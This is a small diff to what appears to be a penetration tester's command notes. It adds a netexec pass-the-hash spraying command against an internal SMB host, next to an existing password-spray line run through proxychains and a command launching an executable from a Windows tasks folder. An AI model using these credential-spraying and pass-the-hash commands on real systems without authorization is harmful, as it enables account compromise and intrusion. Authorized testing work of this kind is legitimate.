@@ -842,6 +842,7 @@ cmd /c c:\windows\tasks\Parishcopsomewhat.exe
 netexec usage (nxc) - nxc smb
 ```
 proxychains -q -f nextcloud.conf nxc smb 192.168.20.10 -u users.txt -p pass.txt --continue-on-success | tee nxc_smb_192.168.20.10.txt
+nxc smb 192.168.20.10 -u users.txt -H hashes.txt --continue-on-success | tee nxc_smb_192.168.20.10.txt
 ```
 nmap hybrid + automate
 ```
